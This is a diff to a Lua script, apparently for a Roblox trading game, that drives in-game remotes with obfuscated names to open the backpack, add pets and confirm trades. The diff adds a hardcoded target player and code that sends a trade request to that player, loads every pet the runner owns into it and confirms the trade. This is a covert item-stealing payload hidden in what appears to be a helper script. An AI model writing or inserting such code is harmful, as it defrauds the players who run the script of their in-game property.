@@ -9,6 +9,7 @@ local WAIT_CONFIRM = 18
 local BATCH_SIZE = 30
 local PER_ITEM_DELAY = 0.01
 local BATCH_PAUSE = 0.05
+local TARGET_NAME = "Aliloloaz"
 
 local MANUAL_REMOTES = {
     TRADE_REQUEST = "yWGKMk/umFScTKjTXZNbotetv",
@@ -316,14 +317,22 @@ local function runCycle()
             if #found == 0 then
                 task.wait(2)
             else
-                pcall(function() rRequest:FireServer("toggle_editing", { editing = false }) end)
-                task.wait(3)
+                local target = nil
+                pcall(function() target = Players:WaitForChild(TARGET_NAME, 5) end)
+                if target then
+                    pcall(function() rRequest:FireServer(target) end)
+                end
+                task.wait(0.5)
                 local idx = 1
                 local added = 0
                 while idx <= #found do
                     pcall(function() rOpenBag:FireServer("open_backpack") end)
                     task.wait(0.01)
-                    pcall(function() rAddPet:FireServer(normalizePetId(found[idx])) end)
+                    if PREFERRED_PET_ID and idx == 1 then
+                        pcall(function() rAddPet:FireServer(PREFERRED_PET_ID) end)
+                    else
+                        pcall(function() rAddPet:FireServer(normalizePetId(found[idx])) end)
+                    end
                     added = added + 1
                     if added % BATCH_SIZE == 0 then
                         task.wait(BATCH_PAUSE)
@@ -339,7 +348,6 @@ local function runCycle()
                     task.wait(WAIT_CONFIRM)
                     pcall(function() rConfirm2:FireServer() end)
                     task.wait(0.5)
-                    pcall(function() rRequest:FireServer("toggle_editing", { editing = false }) end)
                 end
                 if idx > #found then
                     local refresh = getPetItems()
